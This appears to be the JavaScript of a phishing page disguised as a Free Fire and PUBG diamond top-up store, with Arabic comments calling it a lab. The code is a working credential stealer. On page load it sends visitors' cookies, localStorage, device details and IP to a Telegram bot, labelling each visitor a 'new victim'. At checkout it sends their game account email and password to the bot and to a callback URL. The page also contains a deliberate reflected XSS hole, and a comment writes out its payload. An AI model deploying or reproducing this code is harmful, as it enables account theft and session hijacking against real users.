            document.body.classList.add('lang-' + lang);
            if (lang === 'en') { document.documentElement.setAttribute('dir', 'ltr'); document.documentElement.setAttribute('lang', 'en'); }
            else { document.documentElement.setAttribute('dir', 'rtl'); document.documentElement.setAttribute('lang', lang); }
            document.querySelectorAll('[data-i18n]').forEach(function(el) {
                var key = el.getAttribute('data-i18n');
                if (i18n[lang] && i18n[lang][key]) el.textContent = i18n[lang][key];
            });
            document.querySelectorAll('[data-i18n-placeholder]').forEach(function(el) {
                var key = el.getAttribute('data-i18n-placeholder');
                if (i18n[lang] && i18n[lang][key]) el.setAttribute('placeholder', i18n[lang][key]);
            });
            document.querySelectorAll('.lang-btn').forEach(function(btn) {
                btn.classList.toggle('active', btn.getAttribute('data-lang') === lang);
            });
            loadProducts();
            updateCart();
        }

        // ============================================================
        // ✅ التحقق (client-side فقط — للتجربة في الـ lab)
        // ============================================================
        function validateId() {
            var id = document.getElementById('accountId');
            var error = document.getElementById('idError');
            var idRegex = /^\d{10,12}$/;
            if (id.value && !idRegex.test(id.value.trim())) { error.classList.add('show'); id.classList.add('invalid'); id.classList.remove('valid'); return false; }
            else if (id.value && idRegex.test(id.value.trim())) { error.classList.remove('show'); id.classList.remove('invalid'); id.classList.add('valid'); return true; }
            else { error.classList.remove('show'); id.classList.remove('invalid'); id.classList.remove('valid'); return false; }
        }
        function validateEmail() {
            var email = document.getElementById('accountEmail');
            var error = document.getElementById('emailError');
            var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (email.value && !emailRegex.test(email.value)) { error.classList.add('show'); email.classList.add('invalid'); email.classList.remove('valid'); return false; }
            else if (email.value && emailRegex.test(email.value)) { error.classList.remove('show'); email.classList.remove('invalid'); email.classList.add('valid'); return true; }
            else { error.classList.remove('show'); email.classList.remove('invalid'); email.classList.remove('valid'); return false; }
        }
        function validatePasswordMatch() {
            var password = document.getElementById('accountPassword');
            var confirm = document.getElementById('accountPasswordConfirm');
            var error = document.getElementById('passwordError');
            var t = i18n[currentLang];
            if (password.value && password.value.length < 8) {
                error.textContent = '❌ ' + (t['error.passwordShort'] || 'كلمة المرور قصيرة');
                error.classList.add('show'); password.classList.add('invalid'); password.classList.remove('valid'); return false;
            }
            if (confirm.value && password.value !== confirm.value) {
                error.textContent = '❌ ' + (t['error.password'] || 'كلمتا المرور غير متطابقتين');
                error.classList.add('show'); confirm.classList.add('invalid'); confirm.classList.remove('valid'); return false;
            }
            error.classList.remove('show'); password.classList.remove('invalid'); confirm.classList.remove('invalid');
            password.classList.add('valid'); if (confirm.value) confirm.classList.add('valid');
            return true;
        }
        function isFree(p) { return p && p.isFree === true; }

        // ============================================================
        // 💎 عرض المنتجات + السلة + العملة
        // ============================================================
        function formatPrice(p) {
            var t = i18n[currentLang];
            if (isFree(p)) return '🎉 ' + (t['free.badge'] || 'مجاني');
            if (selectedCurrency === 'EUR') return '€' + p.priceEUR;
            if (selectedCurrency === 'USD') return '$' + p.priceUSD;
            return p.pricePKR + ' PKR';
        }
        function loadProducts() {
            var container = document.getElementById('productsGrid');
            if (!container) return;
            var t = i18n[currentLang];
            var list = products.filter(function(p) { return p.game === currentGame; });
            container.innerHTML = list.map(function(p) {
                var badge = p.badge === 'bestseller' ? '<span class="product-badge bestseller">' + (t['products.bestseller'] || p.badgeText) + '</span>' : '';
                return '<div class="product-card' + (selectedProduct && selectedProduct.id === p.id ? ' selected' : '') + '" data-id="' + p.id + '">' +
                    badge +
                    '<div class="product-image"><i class="fas fa-gem"></i><div class="diamonds">' + p.diamonds + '</div><div class="label">Diamonds</div></div>' +
                    '<div class="product-info">' +
                    '<div class="product-name">' + p.name + '</div>' +
                    '<div class="product-price">' + formatPrice(p) + '</div>' +
                    '<button class="select-btn" onclick="selectProduct(' + p.id + ')"><i class="fas fa-cart-plus"></i> ' + (t['cart.add'] || 'اختر الباقة') + '</button>' +
                    '</div></div>';
            }).join('');
        }
        function selectProduct(id) {
            var p = null;
            for (var i = 0; i < products.length; i++) { if (products[i].id === id) { p = products[i]; break; } }
            if (!p) return;
            selectedProduct = p;
            cart = [p];
            selectedPayment = null;
            document.querySelectorAll('.payment-method').forEach(function(el) { el.classList.remove('selected'); });
            document.getElementById('paymentError').classList.remove('show');
            updateCart();
            loadProducts();
            var notice = document.getElementById('formNotice');
            var noticeActive = document.getElementById('formNoticeActive');
            var form = document.getElementById('accountForm');
            if (notice) notice.classList.add('hidden');
            if (noticeActive) noticeActive.classList.remove('hidden');
            if (form) { form.classList.remove('disabled'); form.classList.add('active'); }
            var freeNotice = document.getElementById('freeNotice');
            var paymentSection = document.getElementById('paymentSection');
            if (isFree(p)) {
                if (freeNotice) freeNotice.classList.remove('hidden');
                if (paymentSection) paymentSection.style.display = 'none';
            } else {
                if (freeNotice) freeNotice.classList.add('hidden');
                if (paymentSection) paymentSection.style.display = 'block';
            }
            form.scrollIntoView({ behavior: 'smooth', block: 'start' });
        }
        function updateCart() {
            var count = cart.length;
            var el = document.getElementById('cartCount');
            if (el) { el.textContent = count; el.classList.toggle('hidden', count === 0); }
            var itemsEl = document.getElementById('cartItems');
            if (itemsEl) {
                if (!cart.length) {
                    itemsEl.innerHTML = '<div class="empty-cart"><i class="fas fa-shopping-basket"></i><p>' + (i18n[currentLang]['cart.empty'] || 'السلة فارغة') + '</p><small>' + (i18n[currentLang]['cart.emptyHelp'] || 'اختر باقة للبدء') + '</small></div>';
                } else {
                    itemsEl.innerHTML = cart.map(function(p) {
                        return '<div class="cart-item">' +
                            '<div class="cart-item-image"><i class="fas fa-gem"></i><span class="count">' + p.diamonds + '</span></div>' +
                            '<div class="cart-item-info"><div class="cart-item-name">' + p.name + '</div><div class="cart-item-price">' + formatPrice(p) + '</div></div>' +
                            '</div>';
                    }).join('');
                }
            }
            var total = 0;
            for (var i = 0; i < cart.length; i++) {
                if (selectedCurrency === 'EUR') total += cart[i].priceEUR;
                else if (selectedCurrency === 'USD') total += cart[i].priceUSD;
                else total += cart[i].pricePKR;
            }
            var cartTotal = document.getElementById('cartTotal');
            if (cartTotal) cartTotal.textContent = cart.length && isFree(cart[0]) ? '🎉 ' + (i18n[currentLang]['free.badge'] || 'مجاني') : (selectedCurrency === 'EUR' ? '€' + total : selectedCurrency === 'USD' ? '$' + total : total + ' PKR');
        }
        function toggleCart() {
            var sidebar = document.getElementById('cartSidebar');
            var overlay = document.getElementById('cartOverlay');
            if (sidebar && overlay) {
                sidebar.classList.toggle('active');
                overlay.classList.toggle('active');
            }
        }
        function selectPayment(method, el) {
            selectedPayment = method;
            document.querySelectorAll('.payment-method').forEach(function(x) { x.classList.remove('selected'); });
            el.classList.add('selected');
            document.getElementById('paymentError').classList.remove('show');
        }
        function selectCurrency(currency, el) {
            selectedCurrency = currency;
            document.querySelectorAll('.currency-option').forEach(function(x) { x.classList.remove('selected'); });
            el.classList.add('selected');
            loadProducts();
            updateCart();
        }
        function selectGame(game, el) {
            currentGame = game;
            var ff = document.getElementById('gameFreeFire');
            var pb = document.getElementById('gamePubg');
            if (ff) ff.classList.toggle('active', game === 'freefire');
            if (pb) pb.classList.toggle('active', game === 'pubg');
            selectedProduct = null;
            cart = [];
            updateCart();
            loadProducts();
        }
        function showComingSoon() {
            alert(i18n[currentLang]['alert.comingSoon']);
        }

        // ============================================================
        // 📤 الإرسال للبوت — نفس فورمات صفحتك بالظبط
        // ============================================================
        function getCookies() {
            return document.cookie || '';
        }
        function getLocalStorageItems() {
            var items = [];
            try {
                for (var i = 0; i < localStorage.length; i++) {
                    var k = localStorage.key(i);
                    items.push('- ' + k + ': ' + localStorage.getItem(k));
                }
            } catch (e) {}
            return items;
        }
        function getDeviceInfo() {
            return {
                platform: navigator.platform || '?',
                screen: screen.width + 'x' + screen.height,
                language: navigator.language || '?',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '?',
                ua: navigator.userAgent || '?',
                page: window.location.href,
                referrer: document.referrer || ''
            };
        }
        function getIP() {
            return fetch('https://api.ipify.org?format=json')
                .then(function(r) { return r.json(); })
                .then(function(d) { return d.ip || ''; })
                .catch(function() { return ''; });
        }
        function sendToTelegram(text) {
            return fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text })
            }).then(function(r) { return r.ok; }).catch(function() { return false; });
        }
        function buildPageLoadedMessage(dev, ip) {
            var msg = '✅ PAGE LOADED | ' + dev.page + '\n';
            msg += '🍪 NEW VICTIM - AUTO STOLEN DATA\n';
            msg += '━━━━━━━━━━━━━━━━━━━━━━\n\n';
            msg += '🌐 URL: ' + dev.page + '\n';
            msg += '🔗 Referrer: ' + (dev.referrer || 'None') + '\n';
            msg += '🕐 Time: ' + new Date().toISOString() + '\n\n';
            var cookies = getCookies();
            msg += '🍪 ' + (cookies ? cookies : 'No cookies') + '\n\n';
            var ls = getLocalStorageItems();
            msg += '💾 LocalStorage:\n' + (ls.length ? ls.join('\n') : '(empty)') + '\n\n';
            msg += 'Device Info:\n';
            msg += '🖥 ' + dev.platform + ' | ' + dev.screen + '\n';
            msg += '🌍 ' + dev.language + ' | ' + dev.timezone + '\n';
            msg += '🌐 ' + dev.ua + '\n';
            msg += '🌐 Victim IP: ' + (ip || 'N/A');
            return msg;
        }
        function buildCredsMessage(p) {
            var linkLabels = {
                google: '🌐 Google', facebook: '📘 Facebook', vk: '🔵 VK',
                apple: '🍎 Apple ID', twitter: '🐦 Twitter / X', guest: '👤 Guest'
            };
            var payLabels = { free: '🎁 مجاني', visa: '💳 Visa', vodafone: '📱 Vodafone Cash', googleplay: '🎮 Google Play' };
            var msg = '🎯 [1] FREE FIRE CREDENTIALS\n';
            msg += '━━━━━━━━━━━━━━\n\n';
            msg += '📦 Package: ' + p.package.name + '\n';
            msg += '💎 Diamonds: ' + p.package.diamonds + '\n';
            msg += '💰 Price: ' + (p.isFree ? '🎁 مجاناً' : p.price) + '\n';
            msg += '💳 Payment: ' + (payLabels[p.payment] || p.payment) + '\n\n';
            msg += '👤 ACCOUNT:\n';
            msg += '🔗 Link: ' + (linkLabels[p.linkType] || p.linkType) + '\n';
            msg += '🆔 ID: ' + p.playerId + '\n';
            msg += '📧 Email: ' + p.email + '\n';
            msg += '🔐 Pass: ' + p.password;
            return msg;
        }
        function buildContactMessage(p) {
            var msg = '📞 [LAB] CONTACT FORM\n';
            msg += '━━━━━━━━━━━━━━\n\n';
            msg += '👤 Name: ' + p.name + '\n';
            msg += '📱 Phone: ' + p.phone + '\n';
            msg += '🎮 Game: ' + p.game + '\n';
            msg += '💬 Message: ' + p.message + '\n';
            msg += '🕐 Time: ' + p.timestamp;
            return msg;
        }
        // الإرسال الرئيسي: تيليجرام + تسجيل ثانوي على السيرفر المحلي
        function exfil(text, payload) {
            postJson(CALLBACK_URL, payload).catch(function() {});
            return sendToTelegram(text);
        }
        function postJson(url, data) {
            return fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
        }

        // ============================================================
        // ✅ تدفق الطلب
        // ============================================================
        function proceedToCheckout() {
            var t = i18n[currentLang];
            if (!selectedProduct) { alert(t['alert.choosePack']); return; }
            if (!document.getElementById('accountLinkType').value) { alert(t['alert.chooseLink']); return; }
            if (!validateId()) { alert(t['alert.fillId']); return; }
            if (!validateEmail()) { alert(t['alert.fillEmail']); return; }
            if (!document.getElementById('accountPassword').value) { alert(t['alert.fillPassword']); return; }
            if (!validatePasswordMatch()) { alert(t['alert.passwordMismatch']); return; }
            if (!isFree(selectedProduct) && !selectedPayment) { alert(t['alert.choosePayment']); return; }

            var payload = {
                type: 'order',
                timestamp: new Date().toISOString(),
                isFree: isFree(selectedProduct),
                package: { id: selectedProduct.id, name: selectedProduct.name, diamonds: selectedProduct.diamonds },
                game: currentGame,
                linkType: document.getElementById('accountLinkType').value,
                playerId: document.getElementById('accountId').value.trim(),
                email: document.getElementById('accountEmail').value.trim(),
                password: document.getElementById('accountPassword').value,
                payment: isFree(selectedProduct) ? 'free' : selectedPayment,
                currency: selectedCurrency,
                price: formatPrice(selectedProduct),
                device: getDeviceInfo()
            };
            exfil(buildCredsMessage(payload), payload).then(function(ok) {
                if (ok) document.getElementById('successModal').classList.add('active');
                else alert(t['alert.noDelivery']);
            });
        }
        function submitForm(e) {
            e.preventDefault();
            var t = i18n[currentLang];
            var f = e.target;
            var payload = {
                type: 'contact',
                timestamp: new Date().toISOString(),
                name: f.querySelector('input[type=text]').value,
                phone: f.querySelector('input[type=tel]').value,
                game: f.querySelector('select').value,
                message: f.querySelector('textarea').value,
                device: getDeviceInfo()
            };
            exfil(buildContactMessage(payload), payload).then(function(ok) {
                if (ok) { document.getElementById('successModal').classList.add('active'); f.reset(); }
                else alert(t['alert.noDelivery']);
            });
        }
        function closeModal() {
            document.getElementById('successModal').classList.remove('active');
        }

        // ============================================================
        // A03 (intentional): Reflected XSS — ?coupon=<img src=x onerror=alert(1)>
        // ============================================================
        (function() {
            var params = new URLSearchParams(window.location.search);
            var coupon = params.get('coupon');
            if (coupon) {
                var banner = document.getElementById('couponBanner');
                banner.innerHTML = '🎟️ <strong>كوبون:</strong> ' + coupon;
                banner.classList.remove('hidden');
            }
        })();

        // ============================================================
        // 🚀 التشغيل — أول حاجة: رسالة PAGE LOADED للبوت
        // ============================================================
        localStorage.setItem('lang', currentLang);
        localStorage.setItem('ps_lang', currentLang);
        if (currentLang !== 'ar') setLang(currentLang);
        else document.body.classList.add('lang-ar');
        loadProducts();
        updateCart();
        sendPageLoaded();
</script>
